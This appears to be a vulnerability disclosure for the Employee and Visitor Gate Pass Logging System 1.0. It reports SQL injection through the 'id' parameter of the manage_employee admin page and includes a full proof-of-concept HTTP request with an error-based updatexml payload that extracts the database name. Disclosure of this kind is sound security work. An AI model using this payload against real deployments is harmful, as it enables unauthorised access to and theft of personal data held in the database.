## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/admin/?page=employee/manage_employee&id=2

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via /employee_gatepass/admin/?page=employee/manage_employee, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
GET /employee_gatepass/admin/?page=employee/manage_employee&id=2%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

```

Get the database name through error injection
<img width="1709" alt="image" src="https://github.com/user-attachments/assets/627e3a6d-bd05-4da9-9c10-afc89c48ef67">


Get the database name: employee_gatepass_db
## code analysis:

The id parameter in Master.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.
<img width="1305" alt="image" src="https://github.com/user-attachments/assets/f41ae919-97be-4f23-bff7-631221b12d04">




 
